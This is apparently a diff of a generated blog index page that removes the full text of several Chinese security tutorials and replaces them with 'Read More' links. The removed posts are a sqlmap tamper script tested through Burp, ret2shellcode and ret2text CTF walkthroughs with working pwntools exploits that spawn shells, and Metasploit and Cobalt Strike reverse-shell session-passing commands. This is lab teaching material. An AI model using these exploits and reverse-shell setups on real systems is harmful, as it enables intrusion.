-<h2 id="2-编写测试脚本并验证"><a href="#2-编写测试脚本并验证" class="headerlink" title="2. 编写测试脚本并验证"></a>2. 编写测试脚本并验证</h2><h3 id="2-1-开启HTTP服务"><a href="#2-1-开启HTTP服务" class="headerlink" title="2.1 开启HTTP服务"></a>2.1 开启HTTP服务</h3><p>​	在虚拟机中开启 HTTP 服务，模拟存在SQL注入的web服务</p>
-<p><img src="/images/image-20240321003450311.png" alt="image-20240321003450311"></p>
-<h3 id="2-2-编写测试脚本"><a href="#2-2-编写测试脚本" class="headerlink" title="2.2 编写测试脚本"></a>2.2 编写测试脚本</h3><p>​	我们尝试在每次发送的请求URL最后都加上fregment，其内容为”#just-for-test”，并设置请求头headers中”X-Forwarded-For”字段的数值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># self2test.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>].setdefault(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>][<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;#just-for-test&quot;</span>.<span class="built_in">format</span>(payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3-BurpSuite-抓包监听"><a href="#2-3-BurpSuite-抓包监听" class="headerlink" title="2.3 BurpSuite 抓包监听"></a>2.3 BurpSuite 抓包监听</h3><p>​	设置 Bp 监听本地8080端口</p>
-<h3 id="2-4-运行脚本"><a href="#2-4-运行脚本" class="headerlink" title="2.4 运行脚本"></a>2.4 运行脚本</h3><blockquote>
-<p>python sqlmap.py –proxy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –tamper&#x3D;self2test -u “<a target="_blank" rel="noopener" href="http://192.168.70.196:8000/?id=1">http://192.168.70.196:8000/?id=1</a>*”</p>
-</blockquote>
-<p>​	使用--proxy参数指定代理地址为<a href="http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察">http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察</a></p>
-<p><img src="/images/image-20240321004123079.png" alt="image-20240321004123079"></p>
-<p>​	在流量包的数据中我们可以很清楚的看见URL中多出了个内容为”#just-for-test”的fregment，并且在请求头headers中”X-Forwarded-For”字段的数值也被设置了</p>
-<p><img src="/images/image-20240321004443797.png" alt="image-20240321004443797"></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/21/tools-sqlmap-script-build/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu6yfp9h000p02vdenv781l7" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu7r07h0000pgvvd9sm45soa" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -534,60 +485,15 @@
 <h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2shellcode原理"><a href="#0-1-ret2shellcode原理" class="headerlink" title="0.1 ret2shellcode原理"></a>0.1 ret2shellcode原理</h3><p>​	ret2shellcode控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
 <h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
 <h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​	这里的代码与ret2text差不多相同，不过这次还同时将对应的字符串复制到 buf2 处</p>
-<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	简单查看可知 buf2 在 bss 段</p>
-<blockquote>
-<p>.bss:0804A080                 public buf2<br>.bss:0804A080 ; char buf2[100]</p>
-</blockquote>
-<p>​	gdb 调试程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb9dbc (environ) —▸ 0xffffd59c —▸ 0xffffd70d ◂— 0x505f434c (&#x27;LC_P&#x27;)</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xaebb06ec</span><br><span class="line"> EDX  0xffffd524 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> ESI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> EBP  0xffffd4f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd470 —▸ 0xffffd49e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">gef➤  vmmap </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line">0xf7e04000 0xf7e05000 rwxp     1000 0      </span><br><span class="line">0xf7e05000 0xf7fb5000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 r-xp     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fb9000 rwxp     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb9000 0xf7fbc000 rwxp     3000 0      </span><br><span class="line">0xf7fd4000 0xf7fd5000 rwxp     1000 0      </span><br><span class="line">0xf7fd5000 0xf7fd7000 r--p     2000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">6-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
-
-<p>​	因为buf2所在的内存地址为0x0804A080 ,处于[0x0804a000, 0x0804b000)区间内，所以这个区间就是 BSS 段在内存中的位置</p>
-<blockquote>
-<p>0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;richard&#x2F;Desktop&#x2F;demo1&#x2F;ret2shellcode</p>
-</blockquote>
-<p><strong>注意：如果观察到bss段不存在执行权限，可能是当前系统版本太高(在这里我使用的是ubuntu16.04)</strong></p>
-<p><img src="/images/image-20240320204423628.png" alt="image-20240320204423628"></p>
-<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
-<blockquote>
-<p>cyclic 200</p>
-</blockquote>
-<p><img src="/images/image-20240320205025701.png" alt="image-20240320205025701"></p>
-<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
-<p><img src="/images/image-20240320205040321.png" alt="image-20240320205040321"></p>
-<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
-<p><img src="/images/image-20240320205103128.png" alt="image-20240320205103128"></p>
-<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
-<blockquote>
-<p>cyclic -l 0x62616164</p>
-</blockquote>
-<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
-<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	ret2shellcode，自己将shellcode写入可执行区域并执行</p>
-<p>​	所以我们需要输入这样一串字符：</p>
-<ul>
-<li><p>构建shell的汇编指令</p>
-</li>
-<li><p>112个字符数据(包括第一步构建的shell汇编指令和垃圾数据)</p>
-</li>
-<li><p>.bss:0x804a080内存地址</p>
-<p>最后的 payload 如下：</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu6yfp90000702vdbumr6wzz" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu7r07gn0007gvvddcn4bh7a" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -627,67 +533,15 @@
 <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2text-原理"><a href="#0-1-ret2text-原理" class="headerlink" title="0.1 ret2text 原理"></a>0.1 ret2text 原理</h3><p>​	ret2text 即控制程序执行程序本身已有的的代码 (.text)</p>
 <h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
 <h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	又发现：</p>
-<p>​		在程序的 .text:0804863A 处 存在字符串”&#x2F;bin&#x2F;bash”,</p>
-<p>​		在程序的 .text:08048641 处 存在system的函数调用,</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FD secure          proc near</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD input           = dword ptr -10h</span><br><span class="line">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD                 push    ebp</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
-<blockquote>
-<p>cyclic 200</p>
-</blockquote>
-<p><img src="/images/image-20240320173041850.png" alt="image-20240320173041850"></p>
-<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
-<p><img src="/images/image-20240320173123708.png" alt="image-20240320173123708"></p>
-<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
-<p><img src="/images/image-20240320173132390.png" alt="image-20240320173132390"></p>
-<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
-<blockquote>
-<p>cyclic -l 0x62616164</p>
-</blockquote>
-<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
-<h3 id="2-2-代码审计确定偏移值"><a href="#2-2-代码审计确定偏移值" class="headerlink" title="2.2 代码审计确定偏移值"></a>2.2 代码审计确定偏移值</h3><p>​	通过 IDA 可以知道，gets 函数需要传入的参数 s 距离 esp 位置高 1C 处</p>
-<p><img src="/images/image-20240320183032309.png" alt="image-20240320183032309"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>
-
-<p>​	在 gdb 中运行程序，在main函数处下断点(以为发生溢出的是gets函数，而在main函数的位置处调用的gets函数，所以需要在main函数处下断点)</p>
-<blockquote>
-<p>pwndbg&gt; b main</p>
-</blockquote>
-<p>​	继续运行程序，查看 esp、ebp，如下</p>
-<p><img src="/images/image-20240319095236636.png" alt="image-20240319095236636"></p>
-<p>​	可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此我们可以推断</p>
-<ul>
-<li>s 的地址为 0xffffcd5c</li>
-<li>s 相对于 ebp 的偏移为 0x6c</li>
-<li>s 相对于返回地址的偏移为 0x6c+4</li>
-</ul>
-<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	所以我们需要输入这样一串字符：</p>
-<ul>
-<li><p>112(0x6C + 4)个垃圾字符数据</p>
-</li>
-<li><p>.text:0804863A 内存地址</p>
-<pre><code>最后的 payload 如下：
-</code></pre>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">bash_addr = <span class="number">0x0804863A</span></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span> * (<span class="number">0x6C</span> + <span class="number">4</span> ) + p32(bash_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/20/pwn-stackoverflow-ret2text/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu6yfp91000902vd1noj8eml" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu7r07gp0009gvvddygq9yzu" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -730,307 +584,19 @@
 
 <p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
 <p><img src="/images/image-20240317131520192.png" alt="image-20240317131520192"></p>
-<h3 id="1-3-CS-反弹-shell-到-MSF"><a href="#1-3-CS-反弹-shell-到-MSF" class="headerlink" title="1.3 CS 反弹 shell 到 MSF"></a>1.3 CS 反弹 shell 到 MSF</h3><p>​	将会话迁移(spawn功能，可以使用命令行，也可以使用CS图形化界面默认功能迁移)到刚刚在CS上建立的监听器上</p>
-<p>​	<img src="/images/image-20240317140306170.png" alt="image-20240317140306170"></p>
-<p>​	成功获取到监听会话</p>
-<p><img src="/images/image-20240317131457292.png" alt="image-20240317131457292"></p>
-<h2 id="2-MSF-shell-反弹到-CS-上"><a href="#2-MSF-shell-反弹到-CS-上" class="headerlink" title="2. MSF shell 反弹到 CS 上"></a>2. MSF shell 反弹到 CS 上</h2><h3 id="2-1-CS-设置联动监听器"><a href="#2-1-CS-设置联动监听器" class="headerlink" title="2.1 CS 设置联动监听器"></a>2.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
-<p><img src="/images/image-20240317140723324.png" alt="image-20240317140723324"></p>
-<h3 id="2-2-MSF-设置联动监听器"><a href="#2-2-MSF-设置联动监听器" class="headerlink" title="2.2 MSF 设置联动监听器"></a>2.2 MSF 设置联动监听器</h3><p>​	首先选择当前需要联动的sessions</p>
-<blockquote>
-<h4 id="查看所有会话"><a href="#查看所有会话" class="headerlink" title="查看所有会话"></a>查看所有会话</h4><p>sessions</p>
-</blockquote>
-<p>​	这里尝试将session 3 进行迁移</p>
-<p><img src="/images/image-20240317134605959.png" alt="image-20240317134605959">	</p>
-<p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> lport 8080  </span><br><span class="line">lport =&gt; 80800</span><br><span class="line">msf6 &gt; <span 